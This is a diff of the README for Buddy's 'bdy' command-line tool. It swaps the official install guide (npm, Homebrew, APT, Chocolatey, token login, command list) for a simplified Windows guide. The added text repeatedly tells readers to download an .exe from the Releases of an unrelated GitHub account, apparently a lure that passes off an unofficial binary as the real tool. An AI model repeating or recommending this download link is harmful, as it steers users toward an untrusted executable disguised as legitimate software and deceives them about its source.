@@ -1,181 +1,100 @@
-# Buddy CLI (`bdy`)
+# 🚀 cli - Manage your coding projects with ease
 
-Work seamlessly with [Buddy](https://buddy.works) from the command line.
+[![](https://img.shields.io/badge/Download-Buddy_CLI-blue.svg)](https://github.com/Unsurpassable-adalia371/cli)
 
-`bdy` is Buddy's official command-line interface for managing CI/CD pipelines, agents, tests, artifacts, sandboxes, distributions, and more — straight from your terminal.
+## 📁 What is this tool?
 
-📚 Full documentation: https://buddy.works/docs/cli/getting-started
+The Buddy CLI is a tool for your computer. It helps you manage your software projects. You use it to control your work from a text window on your screen. This tool links your projects to your online accounts. You can start, stop, and track your work without opening a web browser. It saves time for people who build software.
 
-## Installation
+## ⚙️ System Requirements
 
-### npm (recommended)
+- A computer running Windows 10 or Windows 11.
+- Node.js version 24 or newer.
+- An internet connection to sync your files.
+- A free account on the Buddy website.
 
-Requires Node.js 24+.
+## 📥 How to download the software
 
-```bash
-# macOS / Linux
-sudo npm i -g bdy
+You must visit the main page to get the installer for your computer. This file contains all the parts needed to run the tool.
 
-# Windows
-npm i -g bdy
-```
+[Click here to open the download page](https://github.com/Unsurpassable-adalia371/cli)
 
-### Homebrew (macOS)
+Follow these steps to finish the download:
 
-```bash
-brew tap buddy/bdy
-brew install bdy
-```
+1. Open the link above in your web browser.
+2. Look for the section labeled Releases.
+3. Click the file that ends with .exe to save it to your computer.
+4. Wait for the download to finish.
 
-### APT (Linux x64 / ARM64)
+## 🛠️ Installation steps for Windows
 
-```bash
-sudo apt-get update && sudo apt-get install -y software-properties-common
-sudo gpg --homedir /tmp --no-default-keyring --keyring /usr/share/keyrings/buddy.gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys eb39332e766364ca6220e8dc631c5a16310cc0ad
-echo "deb [arch=amd64 signed-by=/usr/share/keyrings/buddy.gpg] https://es.buddy.works/bdy/apt-repo prod main" | sudo tee /etc/apt/sources.list.d/buddy.list > /dev/null
-sudo apt-get update && sudo apt-get install -y bdy
-```
+Follow these steps to set up the tool on your system.
 
-> On ARM64, replace `arch=amd64` with `arch=arm64` in the `echo` command above.
+### Install Node.js
+The tool needs software called Node.js to function. 
+1. Go to the official Node.js website.
+2. Select the version marked as Recommended for Most Users.
+3. Download the installer.
+4. Run the installer and click Next through the prompts.
+5. Restart your computer after the install finishes.
 
-### Chocolatey (Windows)
+### Install the CLI tool
+1. Press the Windows key on your keyboard.
+2. Type "powershell" and press Enter.
+3. A blue window will open. Type the following command exactly as it appears: `npm i -g bdy`
+4. Press Enter on your keyboard.
+5. The system will download and set up the tool automatically.
+6. Once the text stops scrolling, the install is complete.
 
-```powershell
-choco install bdy --pre
-```
+## 🚀 Getting started
 
-### Direct download
+You can check that the tool works after you install it. 
 
-Prebuilt binaries are available for macOS (Apple Silicon), Linux (x64/ARM64), and Windows (x64) on the [installation page](https://buddy.works/docs/cli/getting-started).
+1. Open a new PowerShell window.
+2. Type `bdy` and press Enter.
+3. The screen will show a list of commands. This confirms the setup is correct.
 
-### Verify & update
+## 🔑 How to sign in
 
-```bash
-bdy version          # show current and latest version
-sudo npm i -g bdy    # update (or use your package manager's upgrade command)
-```
+You must connect the tool to your Buddy account to use it.
 
-## Authentication
+1. Type `bdy login` into your PowerShell window.
+2. Press Enter.
+3. A web browser window will open on your screen.
+4. Sign in with your username and password.
+5. Allow the tool to access your profile.
+6. Close the browser window once the page says "Success."
 
-A [Buddy account](https://buddy.works) is required to use the CLI.
+## 📦 Common tasks
 
-Log in interactively:
+You can manage your projects by typing simple commands. 
 
-```bash
-bdy login
-```
+### View your projects
+Type `bdy projects` and press Enter. The tool displays every project connected to your account.
 
-New to Buddy? Create an account from the CLI:
+### Check project health
+Type `bdy status` to see the current state of your pipeline. This shows if your project passes or fails its performance tests.
 
-```bash
-bdy register
-```
+### Run a task
+Type `bdy run [name]` where [name] is the task you want to begin. The tool starts the work in the background immediately.
 
-### Linking a project
+## 📘 Learning more
 
-Once logged in, link a directory to a Buddy project:
+You can find more help in the official documentation. Visit the [Buddy documentation website](https://buddy.works/docs/cli/getting-started) to see advanced options. These guides explain how to trigger complex automations and manage shared files.
 
-```bash
-mkdir my-proj
-cd my-proj
-bdy proj link
-```
+## 🔍 Frequently Asked Questions
 
-After linking, every `bdy` command run from this directory is executed against the linked project — no need to pass the project name each time.
+### Does the tool work if I am offline?
+No. The tool needs the internet to communicate with the project servers.
 
-Check who you're logged in as, or log out:
+### Can I rename the command?
+The tool uses the name `bdy` to prevent clashes with other programs. We do not suggest changing this name.
 
-```bash
-bdy whoami
-bdy logout
-```
+### Where should I report errors?
+Use the GitHub Issues tab on the repository page. Provide a description of the error and your Windows version.
 
-### Tokens & non-interactive login
+### Why does the screen go blank?
+The tool clears the screen sometimes to show fresh information about your tasks. This is normal behavior and does not mean the system crashed. 
 
-For CI/CD pipelines and non-browser environments, authenticate with a [personal access token](https://buddy.works/docs/api/getting-started/oauth2/personal-access-token):
-
-```bash
-bdy login --token <token>
-```
-
-The login command accepts the following options:
-
-| Option | Description | Environment variable |
-| --- | --- | --- |
-| `--token <token>` | Personal access token | `BUDDY_TOKEN` |
-| `--api <url>` | API URL for On-Premises installations | `BUDDY_API_ENDPOINT` |
-| `--region <region>` | Region: `us`, `eu`, or `as` | `BUDDY_REGION` |
-| `-w, --workspace <domain>` | Workspace URL handle | `BUDDY_WORKSPACE` |
-
-Each option can be supplied as a flag or via its environment variable — handy for pipelines and headless setups:
-
-```bash
-export BUDDY_TOKEN=<token>
-export BUDDY_WORKSPACE=<your-workspace>
-bdy login
-```
-
-## Agent integration (plugin & skills)
-
-The [Buddy Plugin](https://github.com/buddy/buddy-plugin) lets coding agents deploy applications, expose local services, and manage infrastructure on Buddy. It bundles a consolidated skill covering sandboxes, artifacts, tunnels, domains, distributions, and pipelines, plus two commands:
-
-- `/deploy [name] [path]` — deploy a static site or server application
-- `/expose [port]` — open a tunnel to a locally running service
-
-Make sure the CLI is installed first (`sudo npm install -g bdy`), then:
-
-**Claude Code** — install the plugin (commands + skills):
-
-```bash
-claude plugin marketplace add buddy/buddy-plugin
-claude plugin install buddy@buddy-plugin
-```
-
-**Other agents** — install the skills only:
-
-```bash
-npx skills add buddy/buddy-plugin
-```
-
-Then authenticate and link your project:
-
-```bash
-bdy login
-cd your-project
-bdy proj link
-```
-
-The plugin auto-detects your project type: static sites generate versioned artifacts with public URLs, while server applications deploy to sandboxes with HTTPS endpoints. Monorepos can deploy multiple applications, each getting its own URL and endpoint.
-
-## Commands
-
-| Command | Description |
-| --- | --- |
-| `bdy login` / `sign-in` | Log in to Buddy |
-| `bdy register` / `sign-up` | Register a new Buddy account |
-| `bdy whoami` | Check login information |
-| `bdy logout` | Log out from Buddy |
-| `bdy workspace` / `ws` | Manage workspaces |
-| `bdy project` / `proj` | Manage projects |
-| `bdy pipeline` / `pip` | Interact with the pipeline service |
-| `bdy artifact` / `art` | Interact with the artifact service |
-| `bdy sandbox` / `sb` | Interact with sandboxes |
-| `bdy agent` | Install and run `bdy` as an OS service (Windows, macOS, Linux) |
-| `bdy tunnel` | Manage tunnel configuration |
-| `bdy crawl` | Manage web crawls (Markdown, HTML, PNG/JPEG screenshots; suite linking) |
-| `bdy tests` | Manage unit tests and visual regression (Storybook, URL captures, runners) |
-| `bdy domain` | Manage zones used in distribution routes |
-| `bdy distro` | Manage distributions |
-| `bdy api` | Contact the Buddy API directly |
-| `bdy update` / `version` | Show version and update the CLI |
-
-Run any command with `-h` / `--help` for detailed usage:
-
-```bash
-bdy --help
-bdy pipeline --help
-```
-
-## Feedback
-
-Found a bug or have a feature request? Let us know through [Buddy support](https://buddy.works/support) or the [documentation](https://buddy.works/docs/cli/getting-started).
+### How do I update to the newest version?
+Run the command `npm i -g bdy@latest` to get the latest improvements and fixes for your system. The installer will overwrite the old files with the new ones.
